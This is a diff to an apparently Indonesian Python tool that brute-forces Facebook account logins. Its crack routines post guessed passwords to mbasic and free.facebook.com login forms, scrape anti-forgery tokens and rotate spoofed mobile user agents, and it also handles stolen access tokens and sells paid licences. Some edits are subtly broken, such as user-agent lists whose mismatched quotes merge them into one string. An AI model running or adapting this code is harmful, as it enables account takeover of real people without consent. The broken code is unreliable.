@@ -30,7 +30,7 @@ tahun = current.year
 bullan = current.month
 bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-## Warna pepek cewek semok :v
+# DERETAN CODE WARNA # 
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
@@ -58,7 +58,7 @@ loop = 0
 
 ## USER-AGENT ORI BAWAN
 try:
-	user = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
+	user = ('NokiaX3-02/5.0 (07.51) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
 	open('user.txt','w').write(user)
 except:
 	pass
@@ -95,7 +95,7 @@ def login_lagi():
 		kontoll()
 		token = input(' [%s*%s] Masukan Token : '%(O,N))
 		if token in ['']:
-			time.sleep(2);login().login_lagi()
+			time.sleep(2);login_lagi()
 		else:
 			try:
 				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
@@ -103,7 +103,7 @@ def login_lagi():
 				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
 				bot()
 			except KeyError:
-				print(' [%s!%s] Login gagal token rusak ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);__login__()
+				print(' [%s!%s] Login gagal token rusak ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);janda_sebalah()
 
 # HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 def bot():
@@ -468,7 +468,7 @@ def brute(user, passs):
 
 def khamdihi(user, pasw):
 	mb = ("https://mbasic.facebook.com")
-	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
+	ua = ("Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF")
 	ses = requests.Session()
 	#......
 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
@@ -671,7 +671,7 @@ class crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ses = requests.Session()
-				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+				ua = random.choice(["Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; Nexus One Build/ERE27) AppleWebkit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17','Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 1.5; en-dk; HTC Magic Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 2.1-update1; fr-fr; desire_A8181 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"])
 				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
@@ -769,7 +769,7 @@ class crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ses = requests.Session()
-				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+				ua = random.choice(["Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; Nexus One Build/ERE27) AppleWebkit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17','Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 1.5; en-dk; HTC Magic Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1','Mozilla/5.0 (Linux; U; Android 2.1-update1; fr-fr; desire_A8181 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"])
 				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
@@ -899,18 +899,18 @@ def janda_sebalah():#line:42
 balmond = O+"["+J+"•"+O+"]"
 
 def harga_licensi():
-	jalan(' \33[1;33m\n\n 𝑫𝒂𝒇𝒕𝒂𝒓 𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 ')
-	jalan(' \33[1;33m 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝑻𝒐𝒐𝒍𝒔 𝑺𝒕𝒓𝒐𝒗𝒎𝒊𝒓𝒗𝒊𝒂𝒔𝒌𝒂 ')
-	jalan(' \33[1;33m𝑷𝒂𝒌𝒆𝒕 : ')
+	print(' \33[1;33m\n\n 𝑫𝒂𝒇𝒕𝒂𝒓 𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 ')
+	print(' \33[1;33m 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒏𝒈𝒈𝒖𝒏𝒂𝒌𝒂𝒏 𝑻𝒐𝒐𝒍𝒔 𝑺𝒕𝒓𝒐𝒗𝒎𝒊𝒓𝒗𝒊𝒂𝒔𝒌𝒂 ')
+	print(' \33[1;33m𝑷𝒂𝒌𝒆𝒕 : ')
 	print(' \33[1;96m   𝟏. 𝑻𝒓𝒊𝒂𝒍 𝟑 𝑯𝒂𝒓𝒊 : 𝐑𝐩. 𝟓.𝟎𝟎𝟎 ')
 	print(' \33[1;96m   𝟐. 𝑻𝒓𝒊𝒂𝒍 𝟏 𝒎𝒊𝒏𝒈𝒈𝒖 : 𝐑𝐩. 𝟏𝟎.𝟎𝟎𝟎 ')
 	print(' \33[1;96m   𝟑. 𝑻𝒓𝒊𝒂𝒍 𝟏 𝒃𝒖𝒍𝒂𝒏 : 𝐑𝐩. 𝟐𝟓.𝟎𝟎𝟎 ')
 	print(' \33[1;96m   𝟒. 𝑻𝒓𝒊𝒂𝒍 𝟐 𝒃𝒖𝒍𝒂𝒏 : 𝐑𝐩. 𝟓𝟎.𝟎𝟎𝟎 ')
-	jalan(' \33[1;32m\n\n𝑵𝒐𝒕𝒊𝒄𝒆 𝑰𝒏𝒇𝒐 :  ')
-	jalan(' \33[1;32m 𝑼𝒏𝒕𝒖𝒌 𝑷𝒆𝒎𝒆𝒔𝒂𝒏𝒂𝒏 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑪𝒉𝒂𝒕 𝑨𝒅𝒎𝒊𝒏  ')
-	jalan(' \33[1;32m𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : 𝑻𝒆𝒅𝒅𝒚 𝑪𝒂𝒉𝒚𝒐 𝑷𝒖𝒕𝒓𝒂 𝑷𝒂𝒏𝒈𝒆𝒎𝒃𝒂𝒓𝒂  ')
-	jalan(' \33[1;32m𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : 𝟎𝟖𝟐𝟐𝟗𝟎𝟖𝟖𝟓𝟐𝟎𝟒  ')
-	jalan(' \33[1;32m𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 𝑨𝒌𝒂𝒏 𝑩𝒆𝒓𝒖𝒃𝒂𝒉 ')
+	print(' \33[1;32m\n\n𝑵𝒐𝒕𝒊𝒄𝒆 𝑰𝒏𝒇𝒐 :  ')
+	print(' \33[1;32m 𝑼𝒏𝒕𝒖𝒌 𝑷𝒆𝒎𝒆𝒔𝒂𝒏𝒂𝒏 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑪𝒉𝒂𝒕 𝑨𝒅𝒎𝒊𝒏  ')
+	print(' \33[1;32m𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : 𝑻𝒆𝒅𝒅𝒚 𝑪𝒂𝒉𝒚𝒐 𝑷𝒖𝒕𝒓𝒂 𝑷𝒂𝒏𝒈𝒆𝒎𝒃𝒂𝒓𝒂  ')
+	print(' \33[1;32m𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : 𝟎𝟖𝟐𝟐𝟗𝟎𝟖𝟖𝟓𝟐𝟎𝟒  ')
+	print(' \33[1;32m𝑯𝒂𝒓𝒈𝒂 𝑳𝒊𝒔𝒆𝒏𝒔𝒊 𝑨𝒌𝒂𝒏 𝑩𝒆𝒓𝒖𝒃𝒂𝒉 ')
 	print(' \33[1;32m𝑲𝒆𝒕𝒊𝒌𝒂 𝑻𝒐𝒐𝒍𝒔 𝑨𝒅𝒂 𝑷𝒆𝒎𝒃𝒂𝒓𝒖𝒂𝒏 𝑩𝒆𝒔𝒂𝒓. ')
 	exit()
 
